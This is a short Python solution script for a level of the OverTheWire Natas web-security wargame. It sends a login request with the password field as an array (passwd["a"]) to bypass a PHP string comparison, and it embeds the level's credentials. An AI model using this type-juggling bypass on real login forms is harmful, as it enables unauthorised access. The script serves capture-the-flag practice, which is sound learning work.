import requests
import re
from string import *
import time
import sys
import codecs

characters = "abcdefghijkjmnopqrstuvwyxzABCDEFGHIJKLMNOPQRSTUVWYXZ0123456789"

for a in range(1):
    logar = ["natas24","OsRmXFguozKpTZZ5X14zNO43379LZveg"]
    url = "http://%s.natas.labs.overthewire.org/"%logar[0]
    session = requests.Session()

    r = session.post(url ,cookies={},data={'passwd["a"]':""}, auth=(logar[0],logar[1]),allow_redirects=0, timeout=10)
    contento = r.text
    print(contento)
    print(session.cookies)


    print("="*80)
